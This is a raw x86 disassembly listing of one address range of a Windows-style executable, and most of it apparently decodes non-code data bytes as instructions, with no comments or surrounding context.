  405fdf:	or     bl,BYTE PTR [ecx+0x2]
  405fe2:	add    al,0x0
  405fe4:	loop   0x405ff0
  405fe6:	pop    esi
  405fe7:	add    al,BYTE PTR [eax+eax*1]
  405fea:	icebp  
  405feb:	or     bl,BYTE PTR [esi+0x2]
  405fee:	add    al,0x0
  405ff0:	add    cl,BYTE PTR [ebx]
  405ff2:	test   DWORD PTR [eax],eax
  405ff4:	add    al,0x0
  405ff6:	adc    DWORD PTR [ebx],ecx
  405ff8:	test   DWORD PTR [eax],eax
  405ffa:	add    al,0x0
  405ffc:	sbb    eax,0x1400850b
  406001:	add    BYTE PTR [esi],ch
  406003:	or     esp,DWORD PTR [edi+0x2]
  406006:	add    DWORD PTR [eax],eax
  406008:	adc    DWORD PTR [edi],ecx
  40600a:	aas    
  40600b:	add    BYTE PTR [ecx],al
  40600d:	add    BYTE PTR [ebp+0x100240f],dl
  406013:	add    BYTE PTR [edx],al
  406015:	adc    BYTE PTR [edi],bh
  406017:	add    BYTE PTR [ecx-0x80],dl
  40601a:	sub    DWORD PTR [eax],edx
  40601c:	test   DWORD PTR [eax],eax
  40601e:	push   ecx
  40601f:	xor    BYTE PTR [esi],0x10
  406022:	test   DWORD PTR [eax],eax
  406024:	xor    DWORD PTR [eax],eax
  406026:	push   ecx
  406027:	adc    BYTE PTR [edx],bh
  406029:	add    esp,DWORD PTR [ecx]
  40602b:	add    BYTE PTR [eax+edx*1+0x3f],ch
  40602f:	add    esp,DWORD PTR [ecx]
  406031:	add    BYTE PTR [ecx+0x10],bh
  406034:	cmp    al,BYTE PTR [ebx]
  406036:	add    DWORD PTR [eax],eax
  406038:	xchg   DWORD PTR [eax],edx
  40603a:	aas    
  40603b:	add    eax,DWORD PTR [ecx]
  40603d:	add    BYTE PTR [esi+0x1033f10],cl
  406043:	add    BYTE PTR [ebp+0x1008510],bl
  406049:	add    BYTE PTR [edi+0x11034410],ah
  40604f:	add    BYTE PTR [ebx+0x31034810],dh
  406055:	add    BYTE PTR [eax+0x3103a812],ah
  40605b:	add    BYTE PTR [eax+0x2103a812],bh
  406061:	add    ah,dh
  406063:	adc    al,BYTE PTR [ebp-0x6ffdf00]
  406069:	adc    al,BYTE PTR [ebp+0xc000100]
  40606f:	adc    eax,DWORD PTR [ebp+0x73002100]
  406075:	adc    eax,DWORD PTR [ebp+0x7c002100]
  40607b:	adc    edi,DWORD PTR [edi]
  40607d:	add    BYTE PTR [ecx],ah
  40607f:	add    BYTE PTR [edx+0x2103c913],al
  406085:	add    BYTE PTR [edi+0x21008513],cl
  40608b:	add    BYTE PTR [edx+0x21008513],bl
  406091:	add    cl,bh
  406093:	adc    al,BYTE PTR [ebp-0x1ffff00]
  406099:	pop    es
  40609a:	lea    eax,[ecx]
  40609c:	add    DWORD PTR [eax],eax
  40609e:	add    eax,0x1008514
  4060a3:	add    BYTE PTR [edx],dl
  4060a5:	adc    al,0x85
  4060a7:	add    BYTE PTR [ecx],al
  4060a9:	add    BYTE PTR [eax],ah
  4060ab:	adc    al,0x85
  4060ad:	add    BYTE PTR [ecx],al
  4060af:	add    BYTE PTR [ecx],dh
  4060b1:	adc    al,0x85
  4060b3:	add    BYTE PTR [ecx],al
  4060b5:	add    BYTE PTR [edx+0x14],dl
  4060b8:	hlt    
  4060b9:	add    eax,DWORD PTR [ecx]
  4060bb:	add    BYTE PTR [edx],al
  4060bd:	or     eax,DWORD PTR [ebp-0x7affff00]
  4060c3:	adc    al,0xf9
  4060c5:	add    eax,DWORD PTR [ecx]
  4060c7:	add    ch,bl
  4060c9:	adc    al,0xfe
  4060cb:	add    eax,DWORD PTR [ecx]
  4060cd:	add    ah,al
  4060cf:	or     bl,BYTE PTR [ecx+0x2]
  4060d2:	add    DWORD PTR [eax],eax
  4060d4:	std    
  4060d5:	adc    al,0x3
  4060d7:	add    al,0x1
  4060d9:	add    BYTE PTR ds:0x1003f15,dl
  4060df:	add    BYTE PTR ds:0x1040715,ch
  4060e5:	add    BYTE PTR [edi+0x15],al
  4060e8:	or     eax,DWORD PTR [ecx+eax*1]
  4060eb:	add    cl,bh
  4060ed:	pop    ss
  4060ee:	aas    
  4060ef:	add    BYTE PTR [ecx],al
  4060f1:	add    BYTE PTR [eax+ebx*1-0x72],al
  4060f5:	add    al,0x1
  4060f7:	add    BYTE PTR [edi+0x19],dl
  4060fa:	lea    eax,[ecx]
  4060fc:	add    DWORD PTR [eax],eax
  4060fe:	popa   
  4060ff:	sbb    DWORD PTR [ebp+0x6e000100],eax
  406105:	sbb    ebx,ecx
  406107:	add    al,0x1
  406109:	add    BYTE PTR [edx],bl
  40610b:	sbb    dh,bl
  40610d:	add    al,0x1
  40610f:	add    BYTE PTR [edi+0x19],dl
  406112:	lea    eax,[ecx]
  406114:	add    DWORD PTR [eax],eax
  406116:	sbb    bl,BYTE PTR [edx]
  406118:	repz add al,0x1
  40611b:	add    BYTE PTR [edi+0x19],dl
  40611e:	lea    eax,[ecx]
  406120:	push   es
  406121:	add    BYTE PTR [edx+0x34],ch
  406124:	lea    eax,[ecx]
  406126:	push   es
  406127:	add    ah,ah
  406129:	pop    ds
  40612a:	mov    ah,0xe
  40612c:	push   es
  40612d:	add    BYTE PTR [edx+0x34],ch
  406130:	lea    eax,[ecx]
  406132:	push   es
  406133:	add    ah,ah
  406135:	pop    ds
  406136:	mov    ah,0xe
  406138:	push   es
  406139:	add    BYTE PTR [edx+0x34],ch
  40613c:	lea    eax,[ecx]
  40613e:	push   es
  40613f:	add    BYTE PTR [eax+0x1d],bh
  406142:	test   DWORD PTR [eax],eax
  406144:	push   es
  406145:	add    bl,ch
  406147:	pop    ds
  406148:	jle    0x406150
  40614a:	push   es
  40614b:	add    al,dh
  40614d:	pop    ds
  40614e:	jle    0x406156
  406150:	push   es
  406151:	add    bh,dh
  406153:	pop    ds
  406154:	test   DWORD PTR [eax],eax
  406156:	push   es
  406157:	add    BYTE PTR [ebx],al
  406159:	and    BYTE PTR [edi],bh
  40615b:	add    BYTE PTR [esi],al
  40615d:	add    BYTE PTR ds:0x6008520,dl
  406163:	add    BYTE PTR [edi],bl
  406165:	and    bl,al
  406167:	push   cs
  406168:	push   es
  406169:	add    BYTE PTR [edx+0x34],ch
  40616c:	lea    eax,[ecx]
  40616e:	push   es
  40616f:	add    dl,dh
  406171:	sbb    al,BYTE PTR [ebp+0x44000600]
  406177:	pop    ds
  406178:	test   DWORD PTR [eax],eax
  40617a:	push   es
  40617b:	add    BYTE PTR [edx+0x34],ch
  40617e:	lea    eax,[ecx]
  406180:	push   es
  406181:	add    bl,bh
  406183:	sbb    eax,0x60085
  406188:	jp     0x4061bf
  40618a:	repz add al,0x6
  40618d:	add    BYTE PTR [edx+0x34],ch
  406190:	lea    eax,[ecx]
  406192:	push   es
  406193:	add    BYTE PTR [edi+0x600851b],bl
  406199:	add    BYTE PTR [ebp+esi*1+0x60085],bh
  4061a0:	push   0x34
  4061a2:	lea    eax,[ecx]
  4061a4:	push   es
  4061a5:	add    BYTE PTR [edi+0x600851b],bl
  4061ab:	add    bh,dh
  4061ad:	xor    eax,0x60ee1
  4061b2:	push   0x34
  4061b4:	lea    eax,[ecx]
  4061b6:	push   es
  4061b7:	add    BYTE PTR [edi+0x600851b],bl
  4061bd:	add    BYTE PTR [edi],ah
  4061bf:	and    bl,ch
  4061c1:	push   cs
  4061c2:	push   eax
  4061c3:	and    DWORD PTR [eax],eax
  4061c5:	add    BYTE PTR [eax],al
  4061c7:	add    BYTE PTR [esi+0x1b057b08],dl
  4061cd:	add    BYTE PTR [ecx],al
  4061cf:	add    BYTE PTR [edi+0x21],dl
  4061d2:	add    BYTE PTR [eax],al
  4061d4:	add    BYTE PTR [eax],al
  4061d6:	xchg   esi,eax
  4061d7:	or     BYTE PTR [ebp+eax*1+0x1001f],cl
  4061de:	ins    BYTE PTR es:[edi],dx
  4061df:	and    DWORD PTR [eax],eax
  4061e1:	add    BYTE PTR [eax],al
  4061e3:	add    BYTE PTR [ebx+0x2705a900],dl
  4061e9:	add    BYTE PTR [edx],al
  4061eb:	add    al,bl
  4061ed:	and    eax,DWORD PTR [eax]
  4061ef:	add    BYTE PTR [eax],al
  4061f1:	add    BYTE PTR [ecx+0x2d05ae00],dl
  4061f7:	add    BYTE PTR [ebx],al
  4061f9:	add    BYTE PTR [eax+0x24],dl
  4061fc:	add    BYTE PTR [eax],al
  4061fe:	add    BYTE PTR [eax],al
  406200:	xchg   ecx,eax
  406201:	add    BYTE PTR [ebp+eax*1+0x3002d],bh
  406208:	je     0x40622e
  40620a:	add    BYTE PTR [eax],al
  40620c:	add    BYTE PTR [eax],al
  40620e:	xchg   ecx,eax
  40620f:	add    al,ch
  406211:	add    eax,0x30031
  406216:	push   esp
  406217:	and    eax,0x0
  40621c:	xchg   BYTE PTR [eax],bl
  40621e:	add    DWORD PTR [esi],eax
  406220:	cmp    eax,DWORD PTR [eax]
  406222:	push   es
  406223:	add    BYTE PTR [edi+0x21],bl
  406226:	add    BYTE PTR [eax],al
  406228:	add    BYTE PTR [eax],al
  40622a:	xchg   ecx,eax
  40622b:	add    BYTE PTR [ebp+0x23],ah
  40622e:	(bad)  
  40622f:	add    eax,0x25480006
  406234:	add    BYTE PTR [eax],al
  406236:	add    BYTE PTR [eax],al
  406238:	xchg   ecx,eax
  406239:	sbb    BYTE PTR [eax+ebp*1+0x8002d],bh
  406240:	pop    esp
  406241:	and    eax,0x0
  406246:	sbb    DWORD PTR [eax],0x1
  406249:	push   es
  40624a:	dec    edx
  40624b:	add    BYTE PTR [eax],cl
  40624d:	add    BYTE PTR [ebx+0x25],ch
  406250:	add    BYTE PTR [eax],al
  406252:	add    BYTE PTR [eax],al
  406254:	out    0x1,al
  406256:	ja     0x40625e
  406258:	push   eax
  406259:	add    BYTE PTR [ecx],cl
  40625b:	add    BYTE PTR [edx+0x25],dh
  40625e:	add    BYTE PTR [eax],al
  406260:	add    BYTE PTR [eax],al
  406262:	out    0x1,al
  406264:	ja     0x40626c
  406266:	pop    eax
  406267:	add    BYTE PTR [ebx],cl
  406269:	add    BYTE PTR [ebp+eiz*1+0x0],bh
  40626d:	add    BYTE PTR [eax],al
  40626f:	add    dh,ah
  406271:	add    DWORD PTR [ebx+0xc005e06],eax
  406277:	add    BYTE PTR [edi+0x25],ch
  40627d:	add    dh,ah
  40627f:	add    DWORD PTR [esi+0xe006506],edi
  406285:	add    BYTE PTR [ecx+0x25],dh
  40628b:	add    dh,ah
  40628d:	add    ecx,esp
  40628f:	push   es
  406290:	ins    DWORD PTR es:[edi],dx
  406291:	add    BYTE PTR [eax],dl
  406293:	add    BYTE PTR [ebx+0x25],dh
  406299:	add    dh,ah
  40629b:	add    DWORD PTR [eax],ecx
  40629d:	pop    es
  40629e:	jbe    0x4062a0
  4062a0:	adc    al,BYTE PTR [eax]
  4062a2:	shl    DWORD PTR ds:0x0,0xe6
  4062a9:	add    DWORD PTR [esi],ebx
  4062ab:	pop    es
  4062ac:	jg     0x4062ae
  4062ae:	adc    al,0x0
  4062b0:	ret    
  4062b1:	and    eax,0x0
  4062b6:	out    0x1,al
  4062b8:	or     BYTE PTR [edi],al
  4062ba:	jbe    0x4062bc
  4062bc:	adc    eax,0x25d800
  4062c1:	add    BYTE PTR [eax],al
  4062c3:	add    dh,ah
  4062c5:	add    DWORD PTR [eax+0x7],edi
  4062c8:	pusha  
  4062c9:	add    DWORD PTR [edi],edx
  4062cb:	add    BYTE PTR [esi+0x26],dl
  4062ce:	add    BYTE PTR [eax],al
  4062d0:	add    BYTE PTR [eax],al
  4062d2:	out    0x1,al
  4062d4:	mov    esi,0x1a006506
  4062d9:	add    BYTE PTR [eax+0x26],bl
  4062dc:	add    BYTE PTR [eax],al
  4062de:	add    BYTE PTR [eax],al
  4062e0:	out    0x1,al
  4062e2:	loope  0x4062ea
  4062e4:	ins    DWORD PTR es:[edi],dx
  4062e5:	add    BYTE PTR [eax+eax*1],bl
  4062e8:	pop    edx
  4062e9:	add    BYTE PTR es:[eax],al
  4062ec:	add    BYTE PTR [eax],al
  4062ee:	out    0x1,al
  4062f0:	push   ds
  4062f1:	pop    es
  4062f2:	jg     0x4062f4
  4062f4:	push   ds
  4062f5:	add    BYTE PTR [esi+eiz*1+0x0],bl
  4062f9:	add    BYTE PTR [eax],al
  4062fb:	add    dh,ah
  4062fd:	add    DWORD PTR [edi+eax*1+0x1f016c],ecx
  406304:	pop    esi
  406305:	add    BYTE PTR es:[eax],al
  406308:	add    BYTE PTR [eax],al
  40630a:	xchg   BYTE PTR [eax],bl
  40630c:	add    DWORD PTR [esi],eax
  40630e:	cmp    eax,DWORD PTR [eax]
  406310:	and    DWORD PTR [eax],eax
  406312:	data16 add BYTE PTR es:[eax],al
  406316:	add    BYTE PTR [eax],al
  406318:	sbb    DWORD PTR [eax],0x1
  40631b:	push   es
  40631c:	jle    0x40631f
  40631e:	and    DWORD PTR [eax],eax
  406320:	test   BYTE PTR [esi],ah
  406322:	add    BYTE PTR [eax],al
  406324:	add    BYTE PTR [eax],al
  406326:	les    eax,FWORD PTR [eax]
  406328:	out    dx,al
  406329:	pop    es
  40632a:	xchg   BYTE PTR [ecx],al
  40632c:	and    eax,DWORD PTR [eax]
  40632e:	loop   0x406356
  406330:	add    BYTE PTR [eax],al
  406332:	add    BYTE PTR [eax],al
  406334:	xchg   BYTE PTR [eax],bl
  406336:	add    DWORD PTR [esi],eax
  406338:	xchg   ecx,eax
  406339:	add    DWORD PTR [eax+eax*1],esp
  40633c:	icebp  
  40633d:	add    BYTE PTR es:[eax],al
  406340:	add    BYTE PTR [eax],al
  406342:	mov    BYTE PTR [eax],0x38
  406345:	or     BYTE PTR [edi+0x26002501],dl
  40634b:	daa    
  40634c:	add    BYTE PTR [eax],al
  40634e:	add    BYTE PTR [eax],al
  406350:	mov    BYTE PTR [eax],0x58
  406353:	or     BYTE PTR [esi+0x4d002601],bl
  406359:	daa    
  40635a:	add    BYTE PTR [eax],al
  40635c:	add    BYTE PTR [eax],al
  40635e:	mov    BYTE PTR [eax],0x69
  406361:	or     BYTE PTR [ebp+0x5b002701],ah
  406367:	daa    
  406368:	add    BYTE PTR [eax],al
  40636a:	add    BYTE PTR [eax],al
  40636c:	xchg   BYTE PTR [eax],al
  40636e:	js     0x406378
  406370:	sahf   
  406371:	add    DWORD PTR [eax],ebp
  406373:	add    BYTE PTR [edx+0x27],al
  406379:	add    BYTE PTR [esi-0x55f74100],al
  40637f:	add    DWORD PTR [ecx],ebp
  406381:	add    BYTE PTR [ecx+0x27],ch
  406387:	add    BYTE PTR [esi-0x4ef72600],al
  40638d:	add    DWORD PTR [edx],ebp
  40638f:	add    cl,al
  406391:	daa    
  406392:	add    BYTE PTR [eax],al
  406394:	add    BYTE PTR [eax],al
  406396:	xchg   BYTE PTR [eax],bl
  406398:	add    DWORD PTR [esi],eax
  40639a:	cmp    eax,DWORD PTR [eax]
  40639c:	sub    al,0x0
  40639e:	cld    
  40639f:	daa    
  4063a0:	add    BYTE PTR [eax],al
  4063a2:	add    BYTE PTR [eax],al
  4063a4:	xchg   BYTE PTR [eax],al
  4063a6:	lds    ecx,FWORD PTR [ecx]
  4063a8:	add    eax,DWORD PTR [edx]
  4063aa:	sub    al,0x0
  4063ac:	mov    al,ds:0x28
  4063b1:	add    BYTE PTR [ecx+0xf09dc00],al
  4063b7:	add    ch,BYTE PTR ds:0x292400
  4063bd:	add    BYTE PTR [eax],al
  4063bf:	add    BYTE PTR [ecx+0x3b0a0500],al
  4063c5:	add    BYTE PTR [esi],ch
  4063c7:	add    BYTE PTR [edx+ebp*1+0x0],dl
  4063cb:	add    BYTE PTR [eax],al
  4063cd:	add    BYTE PTR [ecx+0x190a1e00],al
  4063d3:	add    ch,BYTE PTR [esi]
  4063d5:	add    BYTE PTR [ebx+ebp*1],ch
  4063d8:	add    BYTE PTR [eax],al
  4063da:	add    BYTE PTR [eax],al
  4063dc:	add    DWORD PTR [eax],0x2280a49
  4063e2:	das    
  4063e3:	add    BYTE PTR [ebx+ebp*1+0x0],ah
  4063ea:	add    DWORD PTR [eax],0x2390a71
  4063f0:	xor    DWORD PTR [eax],eax
  4063f2:	jl     0x406420
  4063f4:	add    BYTE PTR [eax],al
  4063f6:	add    BYTE PTR [eax],al
  4063f8:	xchg   esi,eax
  4063f9:	add    BYTE PTR [esi+0x34024b0a],dl
  4063ff:	add    BYTE PTR [edx+0x2c],ah
  406405:	add    dh,ah
  406407:	add    DWORD PTR [edx+ecx*1+0x350250],edi
  40640e:	stos   BYTE PTR es:[edi],al
  40640f:	sub    al,0x0
  406411:	add    BYTE PTR [eax],al
  406413:	add    BYTE PTR [esi+0x3b060118],al
  406419:	add    BYTE PTR [esi],dh
  40641b:	add    BYTE PTR [edx+0x2c],dh
  406421:	add    BYTE PTR [esi+0x3b060118],al
  406427:	add    BYTE PTR [esi],dh
  406429:	add    BYTE PTR [edx+0x2c],bh
  40642f:	add    BYTE PTR [esi+0x760b4308],al
  406435:	add    dh,BYTE PTR [esi]
  406437:	add    dl,al
  406439:	sub    al,0x0
  40643b:	add    BYTE PTR [eax],al
  40643d:	add    BYTE PTR [esi+0x7c0b5708],al
  406443:	add    dh,BYTE PTR [esi]
  406445:	add    dl,cl
  406447:	sub    al,0x0
  406449:	add    BYTE PTR [eax],al
  40644b:	add    BYTE PTR [esi-0x5af496f8],al
  406451:	add    DWORD PTR [esi],esi
  406453:	add    cl,ch
  406455:	sub    al,0x0
  406457:	add    BYTE PTR [eax],al
  406459:	add    BYTE PTR [esi+0x7c0b7b08],al
  40645f:	add    dh,BYTE PTR [edi]
  406461:	add    ah,dh
  406463:	sub    al,0x0
  406465:	add    BYTE PTR [eax],al
  406467:	add    BYTE PTR [esi-0x5af475f8],al
  40646d:	add    DWORD PTR [edi],esi
  40646f:	add    BYTE PTR [ebp+ebp*1+0x0],dh
  406473:	add    BYTE PTR [eax],al
  406475:	add    BYTE PTR [esi-0x7ff466f8],al
  40647b:	add    bh,BYTE PTR [eax]
  40647d:	add    BYTE PTR [ebp+ebp*1+0x0],bh
  406481:	add    BYTE PTR [eax],al
  406483:	add    BYTE PTR [esi-0x7ff454f8],al
  406489:	add    bh,BYTE PTR [eax]
  40648b:	add    BYTE PTR [ebp+ebp*1+0x0],al
  406492:	xchg   BYTE PTR [eax],cl
  406494:	mov    edi,0x38028a0b
  406499:	add    BYTE PTR [ebp+ebp*1+0x0],cl
  4064a0:	xchg   BYTE PTR [eax],cl
  4064a2:	(bad)  [ebx]
  4064a4:	mov    es,WORD PTR [edx]
  4064a6:	cmp    BYTE PTR [eax],al
  4064a8:	cwde   
  4064a9:	sub    eax,0x0
  4064ae:	xchg   BYTE PTR [eax],al
  4064b0:	repz or edx,DWORD PTR [ebx+0x4003902]
  4064b7:	add    BYTE PTR cs:[eax],al
  4064ba:	add    BYTE PTR [eax],al
  4064bc:	xchg   BYTE PTR [eax],al
  4064be:	repz or ebx,DWORD PTR [edx+0x78003c02]
  4064c5:	add    BYTE PTR cs:[eax],al
  4064c8:	add    BYTE PTR [eax],al
  4064ca:	out    0x1,al
  4064cc:	add    ecx,DWORD PTR [eax+eiz*4]
  4064cf:	add    bh,BYTE PTR ds:0x2f2c00
  4064d5:	add    BYTE PTR [eax],al
  4064d7:	add    dh,ah
  4064d9:	add    DWORD PTR ds:0x3e02a70c,ebp
  4064df:	add    BYTE PTR [edi+0x2f],dh
  4064e2:	add    BYTE PTR [eax],al
  4064e4:	add    BYTE PTR [eax],al
  4064e6:	out    0x1,al
  4064e8:	dec    esp
  4064e9:	or     al,0xb2
  4064eb:	add    al,BYTE PTR [ecx+0x0]
  4064ee:	jg     0x40651f
  4064f0:	add    BYTE PTR [eax],al
  4064f2:	add    BYTE PTR [eax],al
  4064f4:	out    0x1,al
  4064f6:	pusha  
  4064f7:	or     al,0xbb
  4064f9:	add    al,BYTE PTR [edx+0x0]
  4064fc:	(bad)  
  4064fd:	das    
  4064fe:	add    BYTE PTR [eax],al
  406500:	add    BYTE PTR [eax],al
  406502:	out    0x1,al
  406504:	mov    cl,BYTE PTR [ecx+eax*8]
  406507:	add    al,BYTE PTR [ebx+0x0]
  40650a:	mov    al,ds:0x2f
  40650f:	add    dh,ah
  406511:	add    DWORD PTR [eax+0x4702ce0c],ebp
  406517:	add    BYTE PTR [eax],bl
  406519:	xor    BYTE PTR [eax],al
  40651b:	add    BYTE PTR [eax],al
  40651d:	add    BYTE PTR [eax+eax*1+0x2dc0cc7],al
  406524:	dec    esp
  406525:	add    BYTE PTR [eax],dh
  406527:	xor    BYTE PTR [eax],al
  406529:	add    BYTE PTR [eax],al
  40652b:	add    BYTE PTR [eax+eax*1+0x2e20cc7],al
  406532:	dec    esi
  406533:	add    BYTE PTR [eax+0x30],ch
  406536:	add    BYTE PTR [eax],al
  406538:	add    BYTE PTR [eax],al
  40653a:	test   BYTE PTR [eax],al
  40653c:	jmp    0x40654a
  40653e:	in     al,dx
  40653f:	add    dl,BYTE PTR [ecx+0x0]
  406542:	dec    esp
  406543:	xor    DWORD PTR [eax],eax
  406545:	add    BYTE PTR [eax],al
  406547:	add    BYTE PTR [eax+eax*1+0x2ec0d0e],al
  40654e:	push   edx
  40654f:	add    BYTE PTR [eax+0x31],bh
  406552:	add    BYTE PTR [eax],al
  406554:	add    BYTE PTR [eax],al
  406556:	test   BYTE PTR [eax],al
  406558:	sub    ecx,DWORD PTR ds:0x5302dc
  40655e:	or     BYTE PTR [edx],dh
  406560:	add    BYTE PTR [eax],al
  406562:	add    BYTE PTR [eax],al
  406564:	test   BYTE PTR [eax],al
  406566:	dec    edx
  406567:	or     eax,0x5502ec
  40656c:	nop
  40656d:	xor    al,BYTE PTR [eax]
  40656f:	add    BYTE PTR [eax],al
  406571:	add    cl,ah
  406573:	add    DWORD PTR [esi+0xd],esp
  406576:	icebp  
  406577:	add    dl,BYTE PTR [esi+0x0]
  40657a:	shl    BYTE PTR [edx],0x0
  40657d:	add    BYTE PTR [eax],al
  40657f:	add    cl,ah
  406581:	add    ecx,edx
  406583:	or     eax,0x5902f9
  406588:	clc    
  406589:	xor    al,BYTE PTR [eax]
  40658b:	add    BYTE PTR [eax],al
  40658d:	add    cl,ah
  40658f:	add    DWORD PTR [esi+ecx*1+0x1],eax
  406593:	add    ebx,DWORD PTR [eax+eax*1+0x33]
  406597:	xor    eax,DWORD PTR [eax]
  406599:	add    BYTE PTR [eax],al
  40659b:	add    cl,ah
  40659d:	add    DWORD PTR [esi+0x6002bb0e],ebx
  4065a3:	add    BYTE PTR [eax+0x33],al
  4065a6:	add    BYTE PTR [eax],al
  4065a8:	add    BYTE PTR [eax],al
  4065aa:	xchg   BYTE PTR [eax],al
  4065ac:	add    BYTE PTR [edi],cl
  4065ae:	or     eax,0x4c006103
  4065b3:	xor    al,0x0
  4065b5:	add    BYTE PTR [eax],al
  4065b7:	add    BYTE PTR [esi+0x3b060118],al
  4065bd:	add    BYTE PTR [edx+0x0],ah
  4065c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c1:	xor    al,0x0
  4065c3:	add    BYTE PTR [eax],al
  4065c5:	add    dh,al
  4065c7:	add    BYTE PTR [ebx+0x62032b0f],bl
  4065cd:	add    BYTE PTR [eax+0x34],ch
  4065d3:	add    cl,ah
  4065d5:	add    DWORD PTR [ebp+0x62028e0f],esi
  4065db:	add    al,dh
  4065dd:	xor    al,0x0
  4065df:	add    BYTE PTR [eax],al
  4065e1:	add    BYTE PTR [esi-0x75f01bf8],al
  4065e7:	add    ah,BYTE PTR [ebx+0x0]
  4065ea:	clc    
  4065eb:	xor    al,0x0
  4065ed:	add    BYTE PTR [eax],al
  4065ef:	add    BYTE PTR [ecx-0x71f00cf8],al
  4065f5:	add    ah,BYTE PTR [ebx+0x0]
  4065f8:	add    al,0x35
  4065fa:	add    BYTE PTR [eax],al
  4065fc:	add    BYTE PTR [eax],al
  4065fe:	sbb    DWORD PTR [eax],0x3520601
  406604:	add    BYTE PTR fs:[ebp+esi*1+0x0],al
  40660c:	add    DWORD PTR [eax],0x3b10c7
  406612:	gs add bl,dh
  406615:	xor    eax,0x0
  40661a:	or     DWORD PTR [eax],0xffffffda
  40661d:	adc    BYTE PTR [ecx+0x3],bl
  406620:	add    BYTE PTR gs:[edi],cl
  406623:	add    BYTE PTR ss:[eax],al
  406626:	add    BYTE PTR [eax],al
  406628:	or     DWORD PTR [eax],0xffffffe5
  40662b:	adc    BYTE PTR [eax+0x3],ah
  40662e:	add    BYTE PTR gs:[ebx],ch
  406631:	add    BYTE PTR ss:[eax],al
  406634:	add    BYTE PTR [eax],al
  406636:	xchg   BYTE PTR [eax],cl
  406638:	clc    
  406639:	adc    BYTE PTR [ebp+0x3],ah
  40663c:	add    BYTE PTR gs:[esi+esi*1],dh
  406640:	add    BYTE PTR [eax],al
  406642:	add    BYTE PTR [eax],al
  406644:	xchg   BYTE PTR [eax],al
  406646:	or     DWORD PTR [ecx],edx
  406648:	imul   eax,DWORD PTR [ebx],0x65
  40664b:	add    BYTE PTR [esi+esi*1+0x0],ch
  40664f:	add    BYTE PTR [eax],al
  406651:	add    BYTE PTR [esi+0x6b111d00],al
  406657:	add    esp,DWORD PTR [esi+0x0]
  40665a:	mov    WORD PTR [esi],?
  40665c:	add    BYTE PTR [eax],al
  40665e:	add    BYTE PTR [eax],al
  406660:	add    DWORD PTR [eax],0x3f
  406663:	adc    DWORD PTR [eax+0x3],esi
  406666:	add    BYTE PTR [si+0x36],dh
  40666b:	add    BYTE PTR [eax],al
  40666d:	add    BYTE PTR [esi+0x7a114c00],dl
  406673:	add    ebp,DWORD PTR [eax+0x0]
  406676:	add    dh,BYTE PTR [edi]
  406678:	add    BYTE PTR [eax],al
  40667a:	add    BYTE PTR [eax],al
  40667c:	xchg   esi,eax
  40667d:	add    BYTE PTR [edi+0x11],bl
  406680:	jp     0x406685
  406682:	push   0x370a00
  406687:	add    BYTE PTR [eax],al
  406689:	add    BYTE PTR [esi+0x7a117200],dl
  40668f:	add    ebp,DWORD PTR [eax+0x0]
  406692:	adc    al,0x37
  406694:	add    BYTE PTR [eax],al
  406696:	add    BYTE PTR [eax],al
  406698:	xchg   ecx,eax
  406699:	add    bl,bl
  40669b:	adc    DWORD PTR [edi+0x3],edi
  40669e:	push   0x376400
  4066a3:	add    BYTE PTR [eax],al
  4066a5:	add    BYTE PTR [esi-0x78edf900],dl
  4066ab:	add    ebp,DWORD PTR [ecx+0x0]
  4066ae:	loopne 0x4066e7
  4066b0:	add    BYTE PTR [eax],al
  4066b2:	add    BYTE PTR [eax],al
  4066b4:	add    DWORD PTR [eax],0x22
  4066b7:	adc    ch,ah
  4066b9:	add    ch,BYTE PTR [edx+0x0]
  4066bc:	add    BYTE PTR [eax],bh
  4066be:	add    BYTE PTR [eax],al
  4066c0:	add    BYTE PTR [eax],al
  4066c2:	xchg   esi,eax
  4066c3:	add    BYTE PTR ds:0x6b038d12,ch
  4066c9:	add    BYTE PTR [eax+edi*1+0x0],bl
  4066d0:	xchg   ecx,eax
  4066d1:	add    BYTE PTR [ebx],bh
  4066d3:	adc    cl,BYTE PTR [ebx+0x2]
  4066d6:	ins    BYTE PTR es:[edi],dx
  4066d7:	add    dl,dl
  4066d9:	cmp    BYTE PTR [eax],al
  4066db:	add    BYTE PTR [eax],al
  4066dd:	add    BYTE PTR [ecx-0x6aedb700],al
  4066e3:	add    ebp,DWORD PTR [ebp+0x0]
  4066e6:	fdivr  QWORD PTR [eax]
  4066e8:	add    BYTE PTR [eax],al
  4066ea:	add    BYTE PTR [eax],al
  4066ec:	xchg   BYTE PTR [eax],al
  4066ee:	popa   
  4066ef:	adc    ch,ah
  4066f1:	add    ch,BYTE PTR [esi+0x0]
  4066f4:	cld    
  4066f5:	cmp    BYTE PTR [eax],al
  4066f7:	add    BYTE PTR [eax],al
  4066f9:	add    BYTE PTR [ebx-0x64ed8800],al
  4066ff:	add    ebp,DWORD PTR [edi+0x0]
  406702:	mov    BYTE PTR [ecx],bh
  406704:	add    BYTE PTR [eax],al
  406706:	add    BYTE PTR [eax],al
  406708:	add    DWORD PTR [eax],0x3a21297
  40670e:	jo     0x406710
  406710:	fdivr  QWORD PTR [ebx]
  406712:	add    BYTE PTR [eax],al
  406714:	add    BYTE PTR [eax],al
  406716:	xchg   ecx,eax
  406717:	sbb    BYTE PTR [eax+ebp*1+0x71002d],bh
  40671e:	add    DWORD PTR [eax+eax*1],edi
  406721:	add    BYTE PTR [eax],al
  406723:	add    dh,ah
  406725:	add    esp,ebp
  406727:	adc    bh,BYTE PTR [esi+0x4007103]
  40672d:	cmp    al,0x0
  40672f:	add    BYTE PTR [eax],al
  406731:	add    BYTE PTR [esi+0x3b060118],al
  406737:	add    BYTE PTR [ebx+0x0],dh
  40673a:	or     al,0x3c
  40673c:	add    BYTE PTR [eax],al
  40673e:	add    BYTE PTR [eax],al
  406740:	out    0x1,al
  406742:	in     al,dx
  406743:	adc    bh,BYTE PTR [esi+0x41007303]
  406749:	cmp    al,0x0
  40674b:	add    BYTE PTR [eax],al
  40674d:	add    BYTE PTR [esi+0x3b060118],al
  406753:	add    BYTE PTR [ebp+0x0],dh
  406756:	dec    ecx
  406757:	cmp    al,0x0
  406759:	add    BYTE PTR [eax],al
  40675b:	add    BYTE PTR [ebx-0x4ef9fee8],al
  406761:	add    DWORD PTR [ebp+0x0],esi
  406764:	pop    edi
  406765:	cmp    al,0x0
  406767:	add    BYTE PTR [eax],al
  406769:	add    BYTE PTR [ebx+0x7c131708],al
  40676f:	add    dh,BYTE PTR [edi+0x0]
  406772:	addr16 cmp al,0x0
  406775:	add    BYTE PTR [eax],al
  406777:	add    BYTE PTR [ebx+0x7c132008],al
